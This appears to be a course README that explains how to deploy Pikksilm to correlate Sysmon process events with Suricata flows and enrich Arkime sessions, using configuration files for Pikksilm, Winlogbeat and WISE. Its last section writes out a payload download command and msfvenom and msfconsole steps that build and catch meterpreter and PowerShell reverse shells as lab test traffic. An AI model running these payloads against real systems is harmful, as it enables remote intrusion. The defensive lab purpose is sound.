# Pikksilm

* [Pikksilm](https://github.com/markuskont/pikksilm)
* [Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [sysmon modular](https://github.com/olafhartong/sysmon-modular)
* [verbose sysmon config](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml)
* [Winlogbeat](https://www.elastic.co/beats/winlogbeat)

Pikksilm bridges **EDR and NDR**: it correlates **endpoint** telemetry (Windows **Sysmon**) with
**network** telemetry (**Suricata** flows) using the shared **Community ID** flow hash. The payoff is
that an Arkime network session can be enriched with *which process, on which host, run by which user*
opened that connection — something the wire alone can't tell you.

## Architecture / data flow (Pikksilm 2.x)

The course build (`singlehost/provision.sh`) installs **Pikksilm 2.0.3** as a prebuilt binary from the
GitHub releases. Everything is glued together through a single redis/valkey instance (port 6379),
using **two logical databases**:

```
 Sysmon ── Winlogbeat ──▶ redis db0  key=winlogbeat ┐
                                                     ├─▶ Pikksilm ──▶ redis db1 ──▶ Arkime WISE ──▶ session enrichment
 Suricata EVE ──────────▶ redis db0  key=suricata   ┘   (correlate by Community ID)
```

1. **Suricata** writes EVE events to **redis db0**, key `suricata`.
2. **Winlogbeat** (shipping **Sysmon** *EventID 1* = process create and *EventID 3* = network
   connection) writes to **redis db0**, key `winlogbeat`.
3. **Pikksilm** consumes both from db0, correlates the Sysmon process+network events with the Suricata
   flow on the **Community ID**, and writes its results to **redis db1**: the `correlations` and an
   enriched `suricata` stream.
4. **Arkime WISE** reads db1 (keyed on `network.community_id`) and decorates the matching session with
   the Sysmon process fields.

## Configuration (Pikksilm 2.x — read the gotcha)

> ⚠️ **Do not bootstrap the config with `pikksilm config`.** In 2.x that subcommand emits a default
> with **every output handler disabled**, so the service starts, logs `winlog: no result handlers`,
> and immediately exits. Write the YAML directly with the redis result handlers enabled.

Minimal working `/etc/pikksilm.yaml` — inputs read from **db0**, outputs go to **db1**:

```yaml
# CDMCS
input:
    suricata:
        redis: { db: 0, host: localhost:6379, key: suricata,    password: "" }
    sysmon:
        redis: { db: 0, host: localhost:6379, key: winlogbeat,  password: "" }
log:
    debug: false
    interval: 30s
output:
    correlations:
        file:  { enabled: false, path: "" }
        redis: { db: 1, enabled: true, host: localhost:6379, password: "" }
    suricata:
        file:  { enabled: false, path: "" }
        redis: { db: 1, enabled: true, host: localhost:6379, key: suricata, password: "" }
persist:
    file: { enabled: false, path: "" }
process:
    suricata: { buffer: 10000, bulk: 100000, cache: 100000, delay: 1s, enabled: true }
    sysmon:   { buffer: 10000, cache: 1000000 }
```

Run it from a systemd unit as a dedicated `pikksilm` system user (the `run` subcommand, **not**
`config`):

```ini
[Unit]
Description=Pikksilm EDR to NDR correlator and enrichment
After=network.target

[Service]
Type=simple
Restart=on-failure
ExecStart=/usr/local/bin/pikksilm --config /etc/pikksilm.yaml run
User=pikksilm
Group=daemon

[Install]
WantedBy=multi-user.target
```

The full, tested install (binary download, user, config, service, plus the Arkime side) lives in
[`singlehost/provision.sh`](../../singlehost/provision.sh).

## Winlogbeat on the endpoint (ECS normalization — REQUIRED)

This is the piece that's easy to miss. Pikksilm 2.x reads Sysmon events in **ECS** form
(`process.entity_id`, `process.name`, `source.ip`, `destination.ip`, **`network.community_id`**).
Winlogbeat's Sysmon→ECS mapping normally runs as an **Elasticsearch ingest pipeline** — which is
**skipped when you ship straight to redis**. So a plain `winlogbeat.event_logs` config delivers only
raw `winlog.event_data.*`; Pikksilm then can't find the fields and emits **empty** correlations with
no community_id (they pile up under an empty-string key and nothing ever enriches). You must do the
ECS mapping **client-side** and compute `community_id` with **seed 0** (to match Suricata + Arkime):

```yaml
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational

processors:
  - copy_fields:
      fields:
        - { from: "winlog.event_data.ProcessGuid",   to: "process.entity_id" }
        - { from: "winlog.event_data.Image",         to: "process.executable" }
        - { from: "winlog.event_data.Image",         to: "process.name" }
        - { from: "winlog.event_data.User",          to: "user.name" }
        - { from: "winlog.computer_name",            to: "host.name" }
        - { from: "winlog.event_data.SourceIp",      to: "source.ip" }
        - { from: "winlog.event_data.DestinationIp", to: "destination.ip" }
        - { from: "winlog.event_data.Protocol",      to: "network.transport" }
      ignore_missing: true
      fail_on_error: false
  - convert:
      fields:
        - { from: "winlog.event_data.SourcePort",      to: "source.port",      type: integer }
        - { from: "winlog.event_data.DestinationPort", to: "destination.port", type: integer }
        - { from: "winlog.event_data.ProcessId",       to: "process.pid",      type: integer }
      ignore_missing: true
      fail_on_error: false
  # community_id wants an iana_number; map Sysmon's tcp/udp string
  - if:
      has_fields: ["network.transport"]
    then:
      - script:
          lang: javascript
          source: >
            function process(evt){var t=evt.Get("network.transport");if(t){t=String(t).toLowerCase();
            evt.Put("network.transport",t);if(t==="tcp")evt.Put("network.iana_number",6);
            else if(t==="udp")evt.Put("network.iana_number",17);}}
  - community_id:
      seed: 0

output.redis:
  hosts: ["<singlehost-ip>:6379"]   # the box running redis + Pikksilm
  key: "winlogbeat"
  db: 0
  datatype: "list"
```

Install **Sysmon** with a config that logs EventID 1 (process create) + EventID 3 (network connect) —
a minimal `<ProcessCreate onmatch="exclude"/>` + `<NetworkConnect onmatch="exclude"/>` works, or use
the olafhartong modular config. Lock down `winlogbeat.yml` perms (`icacls … /inheritance:r`) or
Winlogbeat's strict-perms check refuses to start.

## Arkime / WISE integration

WISE pulls the correlations out of **db1** and maps the Sysmon fields onto Arkime session fields. The
source is keyed on `network.community_id`, so a session matches the endpoint event for the same flow.
In `wiseService.ini`:

```ini
[redis:sysmon_proc]
url=redis://:password@127.0.0.1:6379/1
type=communityid
format=json
template=1:%key%
keyPath=network.community_id
redisMethod=lpop
fields=field:sysmon.processname;db:sysmon.processname;kind:termfield;friendly:Process Name;shortcut:process.name\n...
```

This db1 source is the one fed by Pikksilm 2.x; its fields show up on the session — Process Name,
User, Host Name/IP/MAC, Process PID — so you can pivot from a suspicious flow straight to the process
that caused it.

> **Note:** `provision.sh` also carries a second source, `[redis:sysmonevent1]`, on **db2** (Parent
> Process, Process MD5, Arguments, Integrity Level). That layout predates Pikksilm 2.x, whose config
> above only writes **db1** — so db2 stays empty unless you add a matching `output` to
> `/etc/pikksilm.yaml`. Treat those extra fields as not-yet-wired on the current stack.

## Generating interesting traffic

To get something to correlate you need an endpoint that produces **both** Sysmon process+network
events **and** real traffic on the wire — the payloads below do exactly that.

* [installing metasploit on linux](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/#installing-the-metasploit-framework-on-linux)

### Delivery

```
 Invoke-WebRequest http://server:8000/bad.exe -UseBasicParsing -OutFile bad.exe
```

### Reverse TCP

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=53  -f exe > bad.exe
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set lport 53
msf6 exploit(multi/handler) > exploit

meterpreter > dir

```

### Reverse PS

```
msfvenom -p cmd/windows/reverse_powershell lhost=eth0 lport=8089 > shell.bat
```

```
msfconsole

msf6 > use exploit/multi/handler

msf6 exploit(multi/handler) > set payload cmd/windows/reverse_powershell
msf6 exploit(multi/handler) > set lhost eth0
msf6 exploit(multi/handler) > set LPORT 8089
msf6 exploit(multi/handler) > exploit
```
